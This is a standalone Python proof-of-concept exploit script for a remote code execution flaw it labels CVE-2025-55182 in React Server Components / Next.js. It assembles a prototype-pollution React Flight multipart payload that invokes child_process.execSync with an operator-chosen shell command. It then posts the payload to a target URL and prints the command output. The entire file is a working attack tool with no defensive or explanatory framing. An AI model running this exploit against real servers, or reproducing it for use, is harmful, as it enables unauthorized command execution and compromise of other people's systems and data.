# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json
from typing import Dict, Any


# -----------------------------
# Config / CLI
# -----------------------------
def parse_args():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
    timeout = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    return base, cmd, timeout


# -----------------------------
# Payload Construction
# -----------------------------
def build_crafted_chunk(command: str) -> Dict[str, Any]:
    """
    Build the critical crafted chunk structure required for exploiting CVE-2025-55182.
    Highly modular so future variations (exfil chain, JSON-round-trip RCE, SSRF-hybrid)
    can be added without rewriting the exploit core.
    """

    rce_prefix = (
        f"var res = process.mainModule.require('child_process')"
        f".execSync('{command}',{{'timeout':5000}})"
        f".toString().trim();"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
    )

    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,  # bypass reason→string conversion crash
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": rce_prefix,
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }


def build_files_payload(chunk: Dict[str, Any]) -> Dict[str, Any]:
    """
    React Flight "files" (multipart/form-data) payload.
    - index 0: crafted malicious chunk (raw JSON)
    - index 1: "$@0" trick to retrieve raw representation of chunk[0]
    """
    return {
        "0": (None, json.dumps(chunk)),
        "1": (None, '"$@0"'),
    }


# -----------------------------
# HTTP Exploit Sender
# -----------------------------
def send_payload(base_url: str, files: Dict[str, Any], timeout: int):
    headers = {"Next-Action": "x"}  # minimal trigger — no real action required

    print(f"[+] Sending exploit → {base_url}")
    try:
        res = requests.post(base_url, files=files, headers=headers, timeout=timeout)
        return res
    except Exception as e:
        print(f"[!] Request failed: {e}")
        return None


# -----------------------------
# Main Execution
# -----------------------------
def main():
    base_url, cmd, timeout = parse_args()

    print("[+] Building crafted chunk...")
    crafted = build_crafted_chunk(cmd)

    print("[+] Assembling multipart/form-data payload...")
    files = build_files_payload(crafted)

    print("[+] Dispatching exploit request...")
    res = send_payload(base_url, files, timeout)

    if not res:
        print("[!] No response object returned.")
        return

    print(f"\n[+] Status: {res.status_code}")
    print("[+] Response Body:")
    print(res.text)


if __name__ == "__main__":
    main()
